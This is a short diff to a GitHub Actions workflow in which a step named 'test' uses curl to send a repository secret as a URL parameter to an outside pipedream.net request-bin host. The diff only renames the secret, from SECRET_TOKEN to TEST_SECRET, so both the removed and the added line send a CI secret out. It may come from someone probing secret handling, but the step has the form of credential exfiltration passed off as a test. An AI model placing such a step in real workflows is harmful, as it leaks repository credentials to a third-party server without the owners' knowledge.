@@ -9,4 +9,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: test
-        run: curl "https://enamic4xq4z5k.x.pipedream.net?yo=${{secrets.SECRET_TOKEN}}"
+        run: curl "https://enamic4xq4z5k.x.pipedream.net?yo=${{secrets.TEST_SECRET}}"
